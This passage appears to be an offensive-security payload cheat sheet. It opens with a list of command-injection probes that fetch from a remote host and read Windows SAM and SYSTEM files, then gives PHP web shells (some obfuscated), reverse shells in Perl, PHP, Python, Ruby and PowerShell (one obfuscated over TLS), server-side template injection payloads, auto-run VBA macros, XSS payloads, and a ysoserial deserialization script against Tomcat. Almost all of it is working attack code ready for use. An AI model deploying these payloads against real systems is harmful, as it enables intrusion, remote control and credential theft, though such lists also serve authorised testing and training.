| system('curl http://<RHOST>/.testing/rce_vuln.txt');
; system('curl http://<RHOST>/.testing/rce_vuln.txt');
& system('curl http://<RHOST>/.testing/rce_vuln.txt');
&& system('curl http://<RHOST>/.testing/rce_vuln.txt');
system('curl http://<RHOST>/.testing/rce_vuln.txt')
system('curl http://<RHOST>/.testing/rce_vuln.txt?req=22fd2wdf')
system('curl http://<RHOST>/.testing/rce_vuln.txt');
system('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX')
systeminfo
| systeminfo
; systeminfo
& systeminfo
&& systeminfo
system('ls')
system('pwd')
system('pwd');
|| system('sleep 5');
| system('sleep 5');
; system('sleep 5');
& system('sleep 5');
&& system('sleep 5');
system('sleep 5')
system('sleep 5');
system('wget http://<RHOST>/.testing/rce_vuln.txt?req=22fd2w23')
system('wget http://<RHOST>/.testing/rce_vuln.txt');
system('whoami')
system('whoami');
test*; ls -lhtR /var/www/
test* || perl -e 'print "X"x16096'
test* | perl -e 'print "X"x16096'
test* & perl -e 'print "X"x16096'
test* && perl -e 'print "X"x16096'
test*; perl -e 'print "X"x16096'
$(`type C:\boot.ini`)
&&type C:\\boot.ini
| type C:\Windows\repair\SAM
; type C:\Windows\repair\SAM
& type C:\Windows\repair\SAM
&& type C:\Windows\repair\SAM
type C:\Windows\repair\SAM
| type C:\Windows\repair\SYSTEM
; type C:\Windows\repair\SYSTEM
& type C:\Windows\repair\SYSTEM
&& type C:\Windows\repair\SYSTEM
type C:\Windows\repair\SYSTEM
| type C:\WINNT\repair\SAM
; type C:\WINNT\repair\SAM
& type C:\WINNT\repair\SAM
&& type C:\WINNT\repair\SAM
type C:\WINNT\repair\SAM
type C:\WINNT\repair\SYSTEM
| type %SYSTEMROOT%\repair\SAM
; type %SYSTEMROOT%\repair\SAM
& type %SYSTEMROOT%\repair\SAM
&& type %SYSTEMROOT%\repair\SAM
type %SYSTEMROOT%\repair\SAM
| type %SYSTEMROOT%\repair\SYSTEM
; type %SYSTEMROOT%\repair\SYSTEM
& type %SYSTEMROOT%\repair\SYSTEM
&& type %SYSTEMROOT%\repair\SYSTEM
type %SYSTEMROOT%\repair\SYSTEM
uname
;uname;
| uname -a
; uname -a
& uname -a
&& uname -a
uname -a
|/usr/bin/id
;|/usr/bin/id|
;/usr/bin/id|
$;/usr/bin/id
() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://<RHOST>/.testing/shellshock.txt?vuln=13;curl http://<RHOST>/.testing/shellshock.txt?vuln=15;\");'
() { :;}; wget http://<RHOST>/.testing/shellshock.txt?vuln=11
| wget http://<RHOST>/.testing/rce.txt
& wget http://<RHOST>/.testing/rce.txt
; wget http://<RHOST>/.testing/rce_vuln.txt
$(`wget http://<RHOST>/.testing/rce_vuln.txt`)
&& wget http://<RHOST>/.testing/rce_vuln.txt
wget http://<RHOST>/.testing/rce_vuln.txt
$(`wget http://<RHOST>/.testing/rce_vuln.txt?req=22jjffjbn`)
which curl
which gcc
which nc
which netcat
which perl
which python
which wget
whoami
| whoami
; whoami
' whoami
' || whoami
' & whoami
' && whoami
'; whoami
" whoami
" || whoami
" | whoami
" & whoami
" && whoami
"; whoami
$(`whoami`)
& whoami
&& whoami
{{ get_user_file("C:\boot.ini") }}
{{ get_user_file("/etc/hosts") }}
{{4+4}}
{{4+8}}
{{person.secret}}
{{person.name}}
{1} + {1}
{% For c in [1,2,3]%} {{c, c, c}} {% endfor%}
{{[] .__ Class __.__ base __.__ subclasses __ ()}}
```

## PDF

### Magic Bytes

```console
%PDF-1.5
<PAYLOAD>
%%EOF
```

## Perl Reverse Shell

```console
perl -e 'use Socket;$i="<LHOST>";$p=<LPORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## PHP popen Web Shell

> https://www.php.net/manual/en/function.popen.php

Upload it for example as `webshell.phar`.

```php
<?php
$command = $_GET['cmd'];
$handle = popen($command, 'r');
$output = fgets($handle);
echo $output;
?>
```

## PHP Reverse Shell

### Common Payloads

```php
<?php passthru("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f"); ?>
```

## Operating System

```console
$ php -r '$sock=fsockopen("<LHOST>",<LPORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Upload

```php
<?php file_put_contents($_GET['upload'], file_get_contents("http://<LHOST>:<LPORT>/" . $_GET['upload']); ?>
```

### Upload and Execution

```php
<?php if (isset($_GET['upload'])) {file_put_contents($_GET['upload'], file_get_contents("http://<LHOST>:<LPORT>/" . $_GET['upload'])); }; if (isset($_GET['cmd'])) { system($_GET['cmd']); };?>
```

### Embedded in .png-File

```console
$ echo '<?php passthru("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f"); ?>' >> shell.php.png
```

## PHP Web Shell

### Common Payloads

```php
<?php system($_GET['cmd']); ?>
<?php passthru($_REQUEST['cmd']); ?>
<?php echo exec($_POST['cmd']); ?>
<?php echo passthru($_GET['cmd']); ?>
<?php echo system($_REQUEST['shell']): ?>
```

### Sanity Check

```php
<?php echo "test";?>
```

### Alternative Web Shells

```php
<?=$_GET[0]?>
<?=$_POST[0]?>
<?={$_REQUEST['_']}?>
```

```php
<?=$_="";$_="'";$_=($_^chr(4*4*(5+5)-40)).($_^chr(47+ord(1==1))).($_^chr(ord('_')+3)).($_^chr(((10*10)+(5*3))));$_=${$_}['_'^'o'];echo$_?>
```

```php
<?php echo(md5(1));@system($_GET[0]);?>
```

> http://<RHOST>/<FILE>.php?0=<COMMAND>

## PowerShell Reverse Shell

```console
$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

```console
$ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

```console
$ powershell -nop -exec bypass -c '$client = New-Object System.Net.Sockets.TCPClient("<LHOST>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
```

### Obfuscated Reverse Shell

```console
$gnlSlSXDZ = & ([string]::join('', ( ($(0+0-0-0-0-78+78+78),$(101+101+0-0-0-0-0+0-101),($(119)),$(0+0-0-0-0+45),$($(79)),$(((98))),($(106)),$(101+101+0-0-0-0-0+0-101),$(99+99+0-99),$($(116))) |ForEach-Object{$_<##>}|%{ ( [char][int] $_<#ZdQB8miMexFGoshJ4qKRp1#>)})) |ForEach-Object{<##>$($_)}| % {<#HWEG3yFVCbNOvfYute5#>$_<#o#>}) ([string]::join('', ( ($(83+83+0+0+0-0-83),$(((121))),((115)),$($(116)),$(101+101+0-0-0-0-0+0-101),(($(109))),(46),$(0+0-0-0-0-78+78+78),$(101+101+0-0-0-0-0+0-101),$($(116)),(46),$(83+83+0+0+0-0-83),$(0+0+0+0+111),$(99+99+0-99),(107),$(101+101+0-0-0-0-0+0-101),$($(116)),((115)),(46),(84),($(67)),$(80),($(67)),$(0-0+0-108+108+108),$(0+105),$(101+101+0-0-0-0-0+0-101),(110),$($(116))) |ForEach-Object{$($_)<##>}|%{ ( [char][int] <##>$($_)<##>)})) |ForEach-Object{<#FLut3kIYDMAyO9a2hEH0zQJ4w#>$_<#WI8r#>}| % {<#OjUEN8nkxf#>$($_)})("J5q0aMgvL.xAeq3T8MEcL6sRaXUrOZ.SHUZv12CgW0es7xPkJmtFo.CbYjgiDaIe7GWdPs".replace('CbYjgiDaIe7GWdPs',DDDDDDDD).replace('SHUZv12CgW0es7xPkJmtFo',CCCCCCCC).replace('J5q0aMgvL',AAAAAAAA).replace('xAeq3T8MEcL6sRaXUrOZ',BBBBBBBB),$(EEEEEEEE));$fU4QP = $gnlSlSXDZ.GetStream();$h1okj42 = New-Object System.Net.Security.SslStream($fU4QP,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]));$h1okj42.AuthenticateAsClient('FFFFFFFF', $null, "Tls12", $false);$nf1083fj = new-object System.IO.StreamWriter($h1okj42);$nf1083fj.Write('PS ' + (pwd).Path + '> ');$nf1083fj.flush();[byte[]]$h8r109 = 0..65535|%{0};while(($nf839nf = $h1okj42.Read($h8r109, 0, $h8r109.Length)) -ne 0){$nr81of = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($h8r109,0, $nf839nf);$ngrog49 = (iex $nr81of | Out-String ) 2>&1;$nir1048 = $ngrog49 + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($nir1048);$h1okj42.Write($sendbyte,0,$sendbyte.Length);$h1okj42.Flush()};
```

- AAAAAAAA == 1st octet of <LHOST>
- BBBBBBBB == 2nd octet of <LHOST>
- CCCCCCCC == 3rd octet of <LHOST>
- DDDDDDDD == 4th octet of <LHOST>
- EEEEEEEE == <LHOST>
- FFFFFFFF == Domain to auth as (doesn't really matter, use something that looks like theirs)

### minireverse.ps1

```console
$socket = new-object System.Net.Sockets.TcpClient('127.0.0.1', 413);
if($socket -eq $null){exit 1}
$stream = $socket.GetStream();
$writer = new-object System.IO.StreamWriter($stream);
$buffer = new-object System.Byte[] 1024;
$encoding = new-object System.Text.AsciiEncoding;
do
{
    $writer.Flush();
    $read = $null;
    $res = ""
    while($stream.DataAvailable -or $read -eq $null) {
        $read = $stream.Read($buffer, 0, 1024)
    }
    $out = $encoding.GetString($buffer, 0, $read).Replace("`r`n","").Replace("`n","");
    if(!$out.equals("exit")){
        $args = "";
        if($out.IndexOf(' ') -gt -1){
            $args = $out.substring($out.IndexOf(' ')+1);
            $out = $out.substring(0,$out.IndexOf(' '));
            if($args.split(' ').length -gt 1){
                $pinfo = New-Object System.Diagnostics.ProcessStartInfo
                $pinfo.FileName = "cmd.exe"
                $pinfo.RedirectStandardError = $true
                $pinfo.RedirectStandardOutput = $true
                $pinfo.UseShellExecute = $false
                $pinfo.Arguments = "/c $out $args"
                $p = New-Object System.Diagnostics.Process
                $p.StartInfo = $pinfo
                $p.Start() | Out-Null
                $p.WaitForExit()
                $stdout = $p.StandardOutput.ReadToEnd()
                $stderr = $p.StandardError.ReadToEnd()
                if ($p.ExitCode -ne 0) {
                    $res = $stderr
                } else {
                    $res = $stdout
                }
            }
            else{
                $res = (&"$out" "$args") | out-string;
            }
        }
        else{
            $res = (&"$out") | out-string;
        }
        if($res -ne $null){
        $writer.WriteLine($res)
    }
    }
}While (!$out.equals("exit"))
$writer.close();
$socket.close();
$stream.Dispose()
```

## Python Reverse Shell

```console
$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
$ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
$ python -c 'import pty,subprocess,os,time;(master,slave)=pty.openpty();p=subprocess.Popen(["/bin/su","-c","id","bynarr"],stdin=slave,stdout=slave,stderr=slave);os.read(master,1024);os.write(master,"fruity\n");time.sleep(0.1);print os.read(master,1024);'
$ echo python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' > <FILE><(),2);p=subprocess.call(["/bin/sh","-i"]);' > <FILE>
```

## Remote File Inclusion (RFI)

```php
<?php
exec("bash -c 'exec bash -i &>/dev/tcp/<LHOST>/<LPORT> <&1'");
?>
```

## Ruby Reverse Shell

```console
$ ruby -rsocket -e'f=TCPSocket.open("<LHOST>",<LPORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

## Spoofing Office Marco

> https://github.com/christophetd/spoofing-office-macro

## Server-Side Template Injection (SSTI)

> https://github.com/payloadbox/ssti-payloads

```console
{{2*2}}[[3*3]]
{{3*3}}
{{3*'3'}}
<%= 3 * 3 %>
${6*6}
${{3*3}}
@(6+5)
#{3*3}
#{ 3 * 3 }
{{dump(app)}}
{{app.request.server.all|join(',')}}
{{config.items()}}
{{ [].class.base.subclasses() }}
{{''.class.mro()[1].subclasses()}}
{{ ''.__class__.__mro__[2].__subclasses__() }}
{% for key, value in config.iteritems() %}<dt>{{ key|e }}</dt><dd>{{ value|e }}</dd>{% endfor %}
{{'a'.toUpperCase()}} 
{{ request }}
{{self}}
<%= File.open('/etc/passwd').read %>
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
${"freemarker.template.utility.Execute"?new()("id")}
{{app.request.query.filter(0,0,1024,{'options':'system'})}}
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read() }}
{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
{$smarty.version}
{php}echo `id`;{/php}
{{['id']|filter('system')}}
{{['cat\x20/etc/passwd']|filter('system')}}
{{['cat$IFS/etc/passwd']|filter('system')}}
{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}
{{request|attr(["_"*2,"class","_"*2]|join)}}
{{request|attr(["__","class","__"]|join)}}
{{request|attr("__class__")}}
{{request.__class__}}
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
${T(java.lang.System).getenv()}
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```

## Visual Basic for Application (VBA)

### Basic Structure

Navigate to: `View > Macros`

```console
Sub Document_Open()
  Macro
End Sub

Sub AutoOpen()
  Macro
End Sub

Sub Macro()
  MsgBox ("FOOBAR")
End Sub
```

Save it as `<FILE>.doc` or `<FILE>.docm`.

### Malicious Function

```console
Sub Exec()
  Dim payload As String
  payload = "calc.exe"
  CreateObject("Wscript.Shell").Run payload,0
End Sub
```

Create `AutoOpen()` and `DocumentOpen()` functions to execute the `malicious script`.

## Windows Scripting Host (WSH)

```cmd
C:\> wscript <FILE>.vbs
C:\> cscript <FILE>.vbs
C:\> wscript /e:VBScript C:\<FILE>.txt
```

### Examples

```console
Dim message
message = "<FOOBAR>"
MsgBox message
```

```console
Set shell = WScript.CreateObject(Wscript.Shell"")
shell.Run("C:\Windows\System32\calc.exe" & WScript.ScriptFullName),0,True
```

## Cross-Site Scripting (XSS)

> https://github.com/payloadbox/xss-payload-list

### Common Payloads

```javascript
<script>alert('XSS')</script>
<scr<script>ipt>alert('XSS')</scr<script>ipt>
"><script>alert('XSS')</script>
"><script>alert(String.fromCharCode(88,83,83))</script>
<script src="http://<LHOST>/<FILE>"></script>
```

### IMG Payloads

```javascript
<img src=x onerror=alert('XSS');>
<img src=x onerror=alert('XSS')//
<img src=x onerror=alert(String.fromCharCode(88,83,83));>
<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
<img src=x:alert(alt) onerror=eval(src) alt=xss>
"><img src=x onerror=alert('XSS');>
"><img src=x onerror=alert(String.fromCharCode(88,83,83));>
```

### SVG Payloads

```javascript
<svgonload=alert(1)>
<svg/onload=alert('XSS')>
<svg onload=alert(1)//
<svg/onload=alert(String.fromCharCode(88,83,83))>
<svg id=alert(1) onload=eval(id)>
"><svg/onload=alert(String.fromCharCode(88,83,83))>
"><svg/onload=alert(/XSS/)
<svg><script href=data:,alert(1) />(`Firefox` is the only browser which allows self closing script)
```

### DIV Payloads

```javascript
<div onpointerover="alert(45)">MOVE HERE</div>
<div onpointerdown="alert(45)">MOVE HERE</div>
<div onpointerenter="alert(45)">MOVE HERE</div>
<div onpointerleave="alert(45)">MOVE HERE</div>
<div onpointermove="alert(45)">MOVE HERE</div>
<div onpointerout="alert(45)">MOVE HERE</div>
<div onpointerup="alert(45)">MOVE HERE</div>
```

## xterm Reverse Shell

The following command should be run on the server. It will try to connect back <LHOST> on port `6001/TCP`.

```console
$ xterm -display <LHOST>:1
```

To catch the incoming xterm, start an X-Server on attacker machine (:1 – which listens on port `6001/TCP`.

```console
$ Xnest :1
$ xhost +10.10.10.211
```

## ysoserial

> https://github.com/frohoff/ysoserial

> https://github.com/pwntester/ysoserial.net

```console
$ java -jar ysoserial-master-SNAPSHOT.jar
```

### Create Reverse Shell

```console
$ java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections1 'nc <LHOST> <LPORT> -e /bin/sh' | base64 -w 0
$ java -jar ysoserial.jar Groovy1 calc.exe > groovypayload.bin
```

### Apache Tomcat RCE by Deserialization Skeleton Script

```console
filename=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)
ip=$1
port=$2
cmd="bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'"
jex="bash -c {echo,$(echo -n $cmd | base64)}|{base64,-d}|{bash,-i}"
java -jar ysoserial-master-6eca5bc740-1.jar CommonsCollections4 "$jex" > /tmp/$filename.session
curl -s -F "data=@/tmp/$filename.session" http://<RHOST>:8080/upload.jsp?email=test@mail.com > /dev/null
curl -s http://<RHOST>:8080/ -H "Cookie: JSESSIONID=../../../../../../../../../../opt/samples/uploads/$filename" > /dev/null
```

```console
$ ./shell.sh <RHOST> <RPORT>
```

## ysoserial.net

```cmd
PS C:\> .\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "<COMMAND>" --path="/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="<DECRYPTION_KEY>" --validationalg="SHA1" --validationkey="<VALIDATION_KEY>"
```

### Linux Setup

```console
$ sudo apt-get install -y mono-complete wine winetricks
```

```console
$ winetricks dotnet48
```

```console
$ wine ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "<COMMAND>" --path="/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="<DECRYPTION_KEY>" --validationalg="SHA1" --validationkey="<VALIDATION_KEY>"
```
